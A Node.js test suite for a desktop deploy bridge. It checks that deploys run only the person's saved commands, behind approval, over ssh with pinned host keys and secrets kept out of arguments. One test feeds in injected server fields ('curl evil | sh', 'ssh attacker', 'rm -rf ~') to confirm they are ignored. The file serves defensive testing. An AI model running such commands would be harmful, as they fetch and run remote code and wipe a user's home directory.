const assert = require('node:assert/strict');
const { EventEmitter } = require('node:events');
const { PassThrough } = require('node:stream');
const { test } = require('node:test');
const { createComputerBridge, POLL_PATH, RESULT_PATH, CANCELLED_DEPLOY } = require('../computer-bridge.cjs');
const { approvalView } = require('../computer-approval.cjs');
const { createAwayLeases } = require('../computer-away.cjs');
const deploy = require('../computer-deploy.cjs');
const deploySsh = require('../computer-deploy-ssh.cjs');

// Deploys through the bridge: 1904 names an app and a commit, this computer runs what the person saved.

const ORIGIN = 'https://1904.ai';
const START = 1_700_000_000_000;
const PAIRED = 'cmp_00000001';
const SHA = 'c'.repeat(40);
const NONCE = 'feedfacefeedface';

const flush = async () => { for (let i = 0; i < 40; i++) await new Promise(resolve => setImmediate(resolve)); };
const answer = (status, body) => ({ status, ok: status >= 200 && status < 300, headers: { get: () => null }, json: async () => body });

function setup({ platform = 'macos', recipes = {}, runningStatus = 200, secrets = {}, askSecret = async () => undefined } = {}) {
  let now = START;
  const timers = [];
  const clock = { now: () => now, setTimeout: (fn, ms) => { timers.push({ fn, ms }); return timers.length; }, clearTimeout() {}, tick(ms) { now += ms; } };
  const open = [];
  const deployCalls = [];
  const results = [];
  const state = { runningStatus };
  async function fetch(url, init = {}) {
    const { pathname } = new URL(url);
    assert.match(init.headers.authorization, /^Bearer tok_/);
    if (pathname === POLL_PATH) {
      return new Promise((resolve, reject) => {
        const entry = { resolve: body => resolve(answer(200, body)) };
        open.push(entry);
        init.signal?.addEventListener('abort', () => { open.splice(open.indexOf(entry), 1); reject(new DOMException('aborted', 'AbortError')); });
      });
    }
    if (pathname === deploy.DEPLOYS_PATH) {
      const body = JSON.parse(init.body);
      deployCalls.push(body);
      return answer(body.action === 'running' ? state.runningStatus : 200, {});
    }
    if (pathname === RESULT_PATH) { results.push(JSON.parse(init.body)); return answer(200, {}); }
    throw new Error(`Unexpected request to ${url}`);
  }
  const deliver = body => open.shift().resolve({ enabled: true, computer: { id: PAIRED, name: 'Studio Mac' }, requests: [], cancelled: [], awayEnded: [], ...body });

  const store = deploy.createDeployRecipes({ now: clock.now });
  for (const [appId, input] of Object.entries(recipes)) {
    const saved = store.save({ appId, appName: input.appName ?? appId, repo: input.repo ?? appId, computerId: input.computerId ?? PAIRED }, input);
    assert.equal(saved.ok, true, saved.error);
  }
  let paired = { id: PAIRED, name: 'Studio Mac', token: 'tok_test' };
  let paused = false;
  const link = {
    info: () => paired && { id: paired.id, name: paired.name }, token: async () => paired?.token, forget() { paired = undefined; },
    rename() {}, touch() {}, seenAt: () => START, paused: () => paused, setPaused(value) { paused = value === true; },
    folders: { get: () => undefined, set() {} },
  };
  const children = [];
  function spawn(file, args, options) {
    const child = new EventEmitter();
    child.stdout = new PassThrough();
    child.stderr = new PassThrough();
    child.finish = code => { child.emit('exit', code, null); child.stdout.end(); child.stderr.end(); setImmediate(() => child.emit('close', code, null)); };
    child.pid = 5000 + children.length;
    Object.assign(child, { file, args, options });
    children.push(child);
    return child;
  }
  const prompts = [];
  const written = [];
  const asked = [];
  const notices = [];
  const logged = [];
  const folders = new Set();
  const bridge = createComputerBridge({
    origin: ORIGIN, fetch, link, messages: { has: () => false, clear() {} }, leases: createAwayLeases({ now: clock.now }), platform,
    home: platform === 'windows' ? 'C:\\Users\\dana' : '/Users/dana', user: 'dana',
    env: platform === 'windows' ? { SystemRoot: 'C:\\Windows', PATH: 'C:\\Windows\\System32' } : { SHELL: '/bin/zsh', HOME: '/Users/dana', USER: 'dana', SSH_AUTH_SOCK: '/private/tmp/agent.sock', GITHUB_TOKEN: 'never' },
    log: { append: entry => logged.push({ ...entry }), list: () => [] },
    userData: '/Users/dana/Library/Application Support/1904 Desktop', tmpRoot: platform === 'windows' ? 'C:\\Temp' : '/private/tmp',
    exists: () => true,
    fs: {
      mkdir: async folder => { folders.add(folder); }, stat: async folder => { if (folders.has(folder)) return { isDirectory: () => true }; throw new Error('missing'); },
      mkdtemp: async prefix => `${prefix}1`, realpath: async value => value, rm: async () => {},
      writeFile: async (file, text, options) => { written.push({ file, text, mode: options?.mode }); },
    },
    removeTemp: () => {}, resolvePath: async () => '/usr/bin:/bin', spawn, kill: () => {}, clock,
    ask: (request, options) => new Promise(resolve => {
      const prompt = { request, options, open: true, answer: choice => { prompt.open = false; resolve({ choice, network: false }); } };
      prompts.push(prompt);
      options.signal.addEventListener('abort', () => { prompt.open = false; resolve({ choice: 'decline' }); });
    }),
    onNotice: notice => notices.push(notice),
    deploys: store, nonce: () => NONCE,
    deploySecrets: {
      privateKey: async (appId, pairedId) => pairedId === PAIRED ? secrets[appId]?.privateKey : undefined,
      password: async (appId, pairedId) => pairedId === PAIRED ? secrets[appId]?.password : undefined,
    },
    askSecret: async question => { asked.push(question); return askSecret(question); },
  });
  const run = id => bridge.snapshot({ output: true }).runs.find(entry => entry.id === id);
  return { bridge, clock, timers, written, asked, deliver, deployCalls, results, children, prompts, notices, logged, store, link, state, run, get openPolls() { return open.length; } };
}

let sequence = 0;
const fromServer = (overrides = {}) => ({
  id: `deploy_${String(++sequence).padStart(8, '0')}`, kind: 'deploy', app: { id: 'app_realzy', name: 'Realzy', repo: 'realzy' }, sha: SHA, branch: 'main',
  taskId: 'd'.repeat(32), sender: { id: 'user_1', name: 'Adam' }, createdAt: START, expiresAt: START + 2 * 60 * 60_000, ...overrides,
});
const REMOTE = { appName: 'Realzy', repo: 'realzy', connect: 'ssh deploy@realzy', commands: 'cd /srv/realzy\ngit pull --ff-only\n./build.sh' };

/** What the host would print for a run of `script` that ended with `status`. */
const hostOutput = (text, status) => `${text}__1904_deploy_${NONCE}:${status}\n`;

test('a merged change asks first, then runs the saved commands and tells 1904 how they ended', async () => {
  const t = setup({ recipes: { app_realzy: REMOTE } });
  t.bridge.start();
  await flush();
  // Whatever 1904 puts in the request, only the app and the commit are read.
  const sent = fromServer({ command: 'curl evil | sh', connect: 'ssh attacker', commands: 'rm -rf ~' });
  t.deliver({ deploys: [sent] });
  await flush();
  assert.equal(t.prompts.length, 1, 'approval is on unless the person turned it off for this app');
  assert.equal(t.children.length, 0);
  const prompt = t.prompts[0];
  assert.equal(prompt.request.command, deploy.recipeText(t.store.get('app_realzy', PAIRED)));
  assert.ok(!prompt.request.command.includes('evil') && !prompt.request.command.includes('attacker'));
  assert.equal(prompt.options.full, true, 'it runs with full access, so the prompt says so and Touch ID confirms it');
  assert.equal(prompt.options.startAway, undefined);
  const view = approvalView({ request: prompt.request, computerName: 'Studio Mac', place: prompt.options.describe(prompt.request), full: true, platform: 'macos' });
  assert.deepEqual([view.heading, view.run, view.scopes.map(scope => scope.id), view.reason], ['Deploy Realzy from Studio Mac?', 'Deploy', ['once'], '']);

  prompt.answer('once');
  await flush();
  assert.deepEqual(t.deployCalls, [{ action: 'running', deployId: sent.id }], 'nothing starts until 1904 confirms it is still wanted');
  const child = t.children[0];
  assert.deepEqual(child.args.slice(0, 2), ['-f', '-c']);
  assert.match(child.args[2], /^ssh deploy@realzy 'echo [A-Za-z0-9+/=]+ \| base64 -d \| sh'$/);
  const script = Buffer.from(/echo ([A-Za-z0-9+/=]+) /.exec(child.args[2])[1], 'base64').toString('utf8');
  assert.ok(script.includes(`DEPLOY_SHA='${SHA}'`) && script.includes('./build.sh'));
  assert.equal(child.options.cwd, '/private/tmp/1904-deploy-1', 'commands for a host need nothing of the app on this computer');
  assert.deepEqual(child.options.stdio, ['ignore', 'pipe', 'pipe']);
  assert.deepEqual(child.options.env, {
    PATH: '/usr/bin:/bin', HOME: '/Users/dana', USER: 'dana', SHELL: '/bin/zsh', TERM: 'dumb', TMPDIR: '/private/tmp/1904-deploy-1',
    DEPLOY_SHA: SHA, DEPLOY_BRANCH: 'main', SSH_AUTH_SOCK: '/private/tmp/agent.sock',
  }, 'the minimal environment plus the commit, the branch and the ssh agent; never a token');

  child.stdout.write(hostOutput('Already up to date.\nbuilt\n', 0));
  await flush();
  child.finish(0);
  await flush();
  assert.deepEqual(t.deployCalls[1], {
    action: 'result', deployId: sent.id, status: 'done', exitCode: 0, output: 'Already up to date.\nbuilt\n', stderr: '', durationMs: 0,
  });
  assert.deepEqual(t.results, [], 'a deploy never goes to a task as a command result');
  assert.deepEqual([t.run(sent.id).status, t.run(sent.id).kind, t.run(sent.id).approval, t.run(sent.id).access], ['done', 'deploy', 'once', 'full']);
  assert.equal(t.store.get('app_realzy', PAIRED).lastRun.status, 'done');
  assert.equal(t.logged[0].command, deploy.recipeText(t.store.get('app_realzy', PAIRED)), 'this computer’s own log keeps what ran');
});

test('with “Submit without approval” on for the app, it runs without a prompt and says so', async () => {
  const t = setup({ recipes: { app_realzy: { ...REMOTE, noApproval: true } } });
  t.bridge.start();
  await flush();
  const sent = fromServer();
  t.deliver({ deploys: [sent] });
  await flush();
  assert.equal(t.prompts.length, 0);
  assert.equal(t.children.length, 1);
  assert.deepEqual(t.notices.map(notice => notice.kind), ['deploy-run']);
  t.children[0].stdout.write(hostOutput('oops\n', 2));
  t.children[0].finish(2);
  await flush();
  assert.deepEqual([t.deployCalls[1].status, t.deployCalls[1].exitCode, t.deployCalls[1].message], ['failed', 2, 'The commands ended with exit code 2.']);
  assert.equal(t.run(sent.id).approval, 'deploy-auto');
  assert.deepEqual(t.notices.map(notice => notice.kind), ['deploy-run', 'deploy-finished']);
});

test('an app with no saved commands, or commands saved under another pairing, is refused', async () => {
  const t = setup({ recipes: { app_realzy: { ...REMOTE, noApproval: true, computerId: 'cmp_00000099' } } });
  t.bridge.start();
  await flush();
  const stale = fromServer();
  const unknown = fromServer({ app: { id: 'app_other', name: 'Other', repo: 'other' } });
  t.deliver({ deploys: [stale, unknown, { id: 'deploy_bad00001', kind: 'deploy' }] });
  await flush();
  assert.equal(t.children.length, 0);
  assert.equal(t.prompts.length, 0);
  assert.deepEqual(t.deployCalls.map(call => [call.deployId, call.status, call.message]), [
    [stale.id, 'failed', deploy.NO_RECIPE], [unknown.id, 'failed', deploy.NO_RECIPE], ['deploy_bad00001', 'failed', 'The deploy does not say which app it is for.'],
  ]);
});

test('two apps from one submission deploy one at a time, in the order they arrive', async () => {
  const t = setup({ recipes: {
    app_openls: { appName: 'OpenLS', repo: 'openls', connect: 'ssh deploy@openls', commands: './deploy.sh', noApproval: true },
    app_realzy: { ...REMOTE, noApproval: true },
  } });
  t.bridge.start();
  await flush();
  const first = fromServer({ app: { id: 'app_openls', name: 'OpenLS', repo: 'openls' } });
  const second = fromServer();
  t.deliver({ deploys: [first, second] });
  await flush();
  assert.equal(t.children.length, 1, 'the second waits for the first');
  assert.match(t.children[0].args[2], /^ssh deploy@openls /);
  assert.deepEqual([t.run(first.id).status, t.run(second.id).status], ['running', 'waiting']);
  t.children[0].stdout.write(hostOutput('', 0));
  t.children[0].finish(0);
  await flush();
  assert.equal(t.children.length, 2);
  assert.match(t.children[1].args[2], /^ssh deploy@realzy /);
  t.children[1].stdout.write(hostOutput('', 0));
  t.children[1].finish(0);
  await flush();
  assert.deepEqual(t.deployCalls.filter(call => call.action === 'result').map(call => [call.deployId, call.status]), [[first.id, 'done'], [second.id, 'done']]);
});

test('1904 can take a deploy back before it starts, and declining tells 1904', async () => {
  const t = setup({ recipes: { app_realzy: REMOTE, app_openls: { appName: 'OpenLS', repo: 'openls', commands: './deploy.sh', connect: 'ssh o' } } });
  t.bridge.start();
  await flush();
  const asked = fromServer();
  const waiting = fromServer({ app: { id: 'app_openls', name: 'OpenLS', repo: 'openls' } });
  t.deliver({ deploys: [asked, waiting] });
  await flush();
  t.deliver({ deploysCancelled: [waiting.id] });
  await flush();
  assert.deepEqual([t.run(waiting.id).status, t.run(waiting.id).message], ['cancelled', CANCELLED_DEPLOY]);
  t.prompts[0].answer('decline');
  await flush();
  assert.equal(t.children.length, 0);
  assert.deepEqual(t.deployCalls, [{ action: 'result', deployId: asked.id, status: 'declined', exitCode: null, output: '', stderr: '', durationMs: 0, message: 'The person declined.' }]);
});

test('a deploy 1904 no longer wants never starts', async () => {
  const t = setup({ recipes: { app_realzy: { ...REMOTE, noApproval: true } }, runningStatus: 409 });
  t.bridge.start();
  await flush();
  const sent = fromServer();
  t.deliver({ deploys: [sent] });
  await flush();
  assert.equal(t.children.length, 0);
  assert.equal(t.run(sent.id).status, 'withdrawn');
});

test('output that does not report back from the host is not a finished deploy', async () => {
  const t = setup({ recipes: { app_realzy: { ...REMOTE, noApproval: true } } });
  t.bridge.start();
  await flush();
  const sent = fromServer();
  t.deliver({ deploys: [sent] });
  await flush();
  t.children[0].stdout.write('sh: base64: not found\n');
  t.children[0].finish(0);
  await flush();
  assert.deepEqual([t.deployCalls[1].status, t.deployCalls[1].message], ['failed', deploy.UNCONFIRMED_RUN]);
});

test('Run now uses the saved commands, asks nobody and tells 1904 nothing', async () => {
  const t = setup({ recipes: { app_realzy: REMOTE } });
  const started = t.bridge.runDeployNow('app_realzy');
  assert.equal(started.ok, true);
  await flush();
  assert.equal(t.prompts.length, 0, 'the click in 1904 Desktop’s own window is the approval');
  assert.equal(t.children.length, 1);
  t.children[0].stdout.write(hostOutput('ok\n', 0));
  t.children[0].finish(0);
  await flush();
  assert.deepEqual(t.deployCalls, []);
  assert.deepEqual([t.run(started.id).status, t.run(started.id).approval], ['done', 'manual']);
  assert.deepEqual(t.bridge.runDeployNow('app_missing'), { ok: false, message: deploy.NO_RECIPE });
  // A second click while it is under way does not queue the same app again.
  const again = t.bridge.runDeployNow('app_realzy');
  assert.equal(again.ok, true);
  assert.deepEqual(t.bridge.runDeployNow('app_realzy'), { ok: false, message: 'This app is already deploying. Computer Activity shows it.' });
});

test('on Windows without a connect line PowerShell runs the commands as written', async () => {
  const t = setup({ platform: 'windows', recipes: { app_realzy: { appName: 'Realzy', repo: 'realzy', commands: 'git pull\nnpm run build', noApproval: true } } });
  t.bridge.start();
  await flush();
  const sent = fromServer();
  t.deliver({ deploys: [sent] });
  await flush();
  const child = t.children[0];
  assert.match(child.file, /(pwsh|powershell)\.exe$/i);
  assert.match(child.options.cwd, /^C:\\Users\\dana\\1904\\realzy$/, 'commands for this computer start in the app’s folder');
  assert.equal(child.options.env.DEPLOY_SHA, SHA);
  assert.equal(child.options.env.SSH_AUTH_SOCK, undefined);
  child.finish(0);
  await flush();
  assert.deepEqual([t.deployCalls[1].status, t.deployCalls[1].exitCode], ['done', 0]);
});

test('Pause drops what is waiting, and Disconnect takes “without approval” away', async () => {
  const t = setup({ recipes: { app_realzy: REMOTE, app_openls: { appName: 'OpenLS', repo: 'openls', connect: 'ssh o', commands: './deploy.sh', noApproval: true } } });
  t.bridge.start();
  await flush();
  const asked = fromServer();
  const waiting = fromServer({ app: { id: 'app_openls', name: 'OpenLS', repo: 'openls' } });
  t.deliver({ deploys: [asked, waiting] });
  await flush();
  t.bridge.setPaused(true);
  await flush();
  assert.equal(t.children.length, 0);
  assert.deepEqual([t.run(asked.id).status, t.run(waiting.id).status], ['cancelled', 'cancelled']);
  assert.deepEqual(t.deployCalls.map(call => [call.deployId, call.status]).sort(), [[asked.id, 'cancelled'], [waiting.id, 'cancelled']].sort());
  await t.bridge.disconnect().catch(() => {});
  assert.equal(t.store.all().find(recipe => recipe.appId === 'app_openls').noApproval, false);
});

test('an unanswered deploy prompt closes after 30 minutes and 1904 hears, whatever expiry 1904 sent', async () => {
  const t = setup({ recipes: { app_realzy: REMOTE } });
  t.bridge.start();
  await flush();
  const sent = fromServer({ expiresAt: START + 30 * 24 * 60 * 60_000 });
  t.deliver({ deploys: [sent] });
  await flush();
  assert.equal(t.prompts.length, 1);
  const limit = t.timers.filter(timer => timer.ms === deploy.DEPLOY_PROMPT_MS);
  assert.equal(limit.length, 1, 'the prompt has its own limit, not 1904’s expiry');
  limit[0].fn();
  await flush();
  assert.equal(t.run(sent.id).status, 'expired');
  assert.deepEqual(t.deployCalls.map(call => [call.deployId, call.status]), [[sent.id, 'cancelled']]);
  assert.equal(t.children.length, 0);
});

// ── A host the person filled in: 1904 Desktop starts ssh itself ───────────────

// Not a key: a stand-in with a key file's first and last lines, put together here so no scanner mistakes it for one.
const FAKE_PRIVATE_KEY = ['-----BEGIN OPENSSH', 'PRIVATE KEY-----'].join(' ') + '\nnot-a-real-key\n' + ['-----END OPENSSH', 'PRIVATE KEY-----'].join(' '); // gitleaks:allow
const HOST_KEY = 'realzy.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ' + 'x'.repeat(42);
const onHost = (auth, extra = {}) => ({ appName: 'Realzy', repo: 'realzy', host: { name: 'realzy.internal', user: 'deploy', auth, keys: [HOST_KEY] }, commands: 'cd /srv/realzy\ngit pull --ff-only', noApproval: true, ...extra });

test('with a deploy key, ssh is started directly with the key and the pinned identity for that run only', async () => {
  const t = setup({ recipes: { app_realzy: onHost('key') }, secrets: { app_realzy: { privateKey: FAKE_PRIVATE_KEY } } });
  t.bridge.start();
  await flush();
  const sent = fromServer();
  t.deliver({ deploys: [sent] });
  await flush();
  const child = t.children[0];
  assert.equal(child.file, '/usr/bin/ssh', 'no shell on this computer reads the host, the user or a path');
  assert.deepEqual(child.args.slice(-6, -1), ['-p', '22', '-l', 'deploy', '--', 'realzy.internal'].slice(-5));
  assert.match(child.args.at(-1), /^echo [A-Za-z0-9+/=]+ \| base64 -d \| sh$/);
  assert.equal(child.args[child.args.indexOf('-i') + 1], '/private/tmp/1904-deploy-1/key');
  assert.ok(child.args.includes('StrictHostKeyChecking=yes') && child.args.includes('BatchMode=yes'));
  assert.deepEqual(t.written.map(file => [file.file, file.mode]), [['/private/tmp/1904-deploy-1/known_hosts', 0o600], ['/private/tmp/1904-deploy-1/key', 0o600]]);
  assert.equal(t.written[0].text, HOST_KEY + '\n');
  assert.equal(t.written[1].text, FAKE_PRIVATE_KEY + '\n', 'written whole, ending in a line break as ssh expects');
  assert.equal(child.options.env.SHELL, '/bin/zsh', 'ssh still gets the person’s real shell, for a ProxyCommand');
  assert.equal(child.options.env[deploySsh.SECRET_ENV], undefined);
  assert.equal(child.options.cwd, '/private/tmp/1904-deploy-1');
  child.stdout.write(hostOutput('Already up to date.\n', 0));
  child.finish(0);
  await flush();
  assert.deepEqual([t.deployCalls.at(-1).status, t.deployCalls.at(-1).output], ['done', 'Already up to date.\n']);
  assert.match(t.run(sent.id).command, /ssh to deploy@realzy\.internal, signing in with the deploy key 1904 Desktop made/);
});

test('a missing deploy key or saved password fails the deploy before anything connects', async () => {
  const t = setup({ recipes: { app_realzy: onHost('key'), app_openls: { ...onHost('password-saved'), appName: 'OpenLS', repo: 'openls' } } });
  t.bridge.start();
  await flush();
  t.deliver({ deploys: [fromServer(), fromServer({ app: { id: 'app_openls', name: 'OpenLS', repo: 'openls' } })] });
  await flush();
  assert.equal(t.children.length, 0);
  assert.deepEqual(t.deployCalls.map(call => [call.action, call.status]), [['result', 'failed'], ['result', 'failed']], '1904 was never told a deploy started');
  assert.match(t.deployCalls[0].message, /deploy key is not on this computer anymore/);
  assert.match(t.deployCalls[1].message, /password saved for this host is not on this computer anymore/);
});

test('a saved password travels only in ssh’s environment, with the helper that hands it over', async () => {
  const t = setup({ recipes: { app_realzy: onHost('password-saved') }, secrets: { app_realzy: { password: 's3cret pass' } } });
  t.bridge.start();
  await flush();
  t.deliver({ deploys: [fromServer()] });
  await flush();
  const child = t.children[0];
  assert.ok(child.args.includes('PubkeyAuthentication=no') && child.args.includes('NumberOfPasswordPrompts=1'));
  assert.ok(!child.args.some(arg => arg.includes('s3cret')), 'never an argument');
  assert.ok(!t.written.some(file => file.text.includes('s3cret')), 'never a file');
  assert.equal(child.options.env[deploySsh.SECRET_ENV], 's3cret pass');
  assert.equal(child.options.env.SSH_ASKPASS, '/private/tmp/1904-deploy-1/1904-askpass');
  assert.equal(child.options.env.SSH_ASKPASS_REQUIRE, 'force');
  assert.deepEqual(t.written.map(file => [file.file, file.mode]), [['/private/tmp/1904-deploy-1/known_hosts', 0o600], ['/private/tmp/1904-deploy-1/1904-askpass', 0o700]]);
  assert.equal(t.asked.length, 0);
});

test('a password typed at each deploy is asked for first, and not typing one cancels the deploy', async () => {
  let answer = 'typed once';
  const t = setup({ recipes: { app_realzy: onHost('password-ask') }, askSecret: async () => answer });
  t.bridge.start();
  await flush();
  const first = fromServer();
  t.deliver({ deploys: [first] });
  await flush();
  assert.deepEqual([t.asked.length, t.asked[0].host.name, t.asked[0].request.app.name], [1, 'realzy.internal', 'Realzy']);
  assert.equal(t.children[0].options.env[deploySsh.SECRET_ENV], 'typed once');
  assert.deepEqual(t.deployCalls[0], { action: 'running', deployId: first.id }, 'asked for before 1904 hears the deploy is starting');
  t.children[0].stdout.write(hostOutput('', 0));
  t.children[0].finish(0);
  await flush();

  answer = undefined;
  const second = fromServer();
  t.deliver({ deploys: [second] });
  await flush();
  assert.equal(t.children.length, 1, 'nothing connected');
  assert.deepEqual([t.deployCalls.at(-1).deployId, t.deployCalls.at(-1).status], [second.id, 'cancelled']);
  assert.match(t.deployCalls.at(-1).message, /No password was entered/);
});

test('a dry run checks the commands on the host, runs none and is not the app’s last deploy', async () => {
  const t = setup({ recipes: { app_realzy: onHost('key', { noApproval: false }) }, secrets: { app_realzy: { privateKey: 'KEY PRIVATE KEY' } } });
  const started = t.bridge.runDeployNow('app_realzy', { dryRun: true });
  assert.equal(started.ok, true);
  await flush();
  assert.equal(t.prompts.length, 0);
  const script = Buffer.from(/echo ([A-Za-z0-9+/=]+) /.exec(t.children[0].args.at(-1))[1], 'base64').toString('utf8');
  assert.ok(script.includes('| base64 -d | sh -n'), 'the commands are only parsed');
  assert.ok(!script.includes('set -e'), 'never the deploy script');
  t.children[0].stdout.write(hostOutput('Connected as deploy on realzy.\nThe commands parse.\n', 0));
  t.children[0].finish(0);
  await flush();
  assert.deepEqual(t.deployCalls, [], '1904 hears nothing of a dry run');
  const notice = t.notices.find(entry => entry.kind === 'dry-run-finished');
  assert.deepEqual([notice.status, notice.output], ['done', 'Connected as deploy on realzy.\nThe commands parse.\n']);
  assert.equal(t.store.get('app_realzy', PAIRED).lastRun, undefined);
  assert.deepEqual([t.run(started.id).approval, t.run(started.id).task.title], ['dry-run', 'Dry run for Realzy']);
});
